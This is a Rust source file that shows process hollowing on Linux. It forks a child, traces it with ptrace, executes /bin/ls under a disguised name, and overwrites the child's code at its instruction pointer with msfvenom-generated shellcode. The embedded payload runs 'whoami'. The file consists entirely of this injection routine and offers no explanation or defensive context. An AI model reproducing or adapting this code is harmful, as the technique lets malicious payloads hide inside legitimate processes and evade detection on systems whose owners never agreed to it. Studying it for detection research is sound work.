use std::ffi::CString;
use nix::libc;
use nix::sys::signal::Signal;
use nix::unistd::{fork , ForkResult, execve};
use nix::sys::{ptrace, wait};
use nix::sys::wait::waitpid;

fn main() {   
    // msfvenom -p linux/x64/exec CMD=whoami -f rust
    let shellcode: [u8; 43] = [
        0x48,0xb8,0x2f,0x62,0x69,0x6e,0x2f,
        0x73,0x68,0x00,0x99,0x50,0x54,0x5f,0x52,0x66,0x68,0x2d,0x63,
        0x54,0x5e,0x52,0xe8,0x07,0x00,0x00,0x00,0x77,0x68,0x6f,0x61,
        0x6d,0x69,0x00,0x56,0x57,0x54,0x5e,0x6a,0x3b,0x58,0x0f,0x05
    ];

    let binary = "/bin/ls";
    let binary_name = "/bin/ls hollowed";

    match unsafe { fork() } {
        Ok(ForkResult::Child) => { 
            if ptrace::traceme().is_ok() {
                println!("Running {} with execve...", binary);
                let executable = CString::new(binary).unwrap();
                let arg1 = CString::new(binary_name).unwrap();
                let args = [
                    arg1.as_c_str(), 
                ];
                let env: [&std::ffi::CStr; 0] = [];

                execve(&executable, &args, &env).unwrap();
            } else {
                println!("Failed to trace the process!");
            }
         },
        Ok(ForkResult::Parent { child, ..}) => {
            println!("Child process spawned as PID {}", child);
            
            /* Wait for the child to be stopped */
            let status = waitpid(child, None).unwrap();

            /* Only proceed if the process is trapped */
            if status  == wait::WaitStatus::Stopped(child, Signal::SIGTRAP) {
                println!("Child Process ({}) Trapped", child);

                let regs = ptrace::getregs(child).unwrap();

                println!("RIP address: {:#x}", regs.rip);

                println!("Writing shellcode to child process...");
                let mut addr = regs.rip as usize;

                for chunk in shellcode.chunks(std::mem::size_of::<i64>()) {
                    let mut padded = [0u8; std::mem::size_of::<i64>()];
                    padded[..chunk.len()].copy_from_slice(chunk);

                    let value = i64::from_ne_bytes(padded);

                    let written = ptrace::write(child, addr as *mut libc::c_void, value as i64);
                    if written.is_ok() {
                        println!("Wrote chunk to {:#x}: {:#x}", addr, value);
                    } else {
                        println!("Failed to write chunk to {:#x}", addr);
                        return;
                    }
                    addr += std::mem::size_of::<i64>();
                }
            }
        },
        Err(e) => println!("Fork failed: {}", e),
    }
}
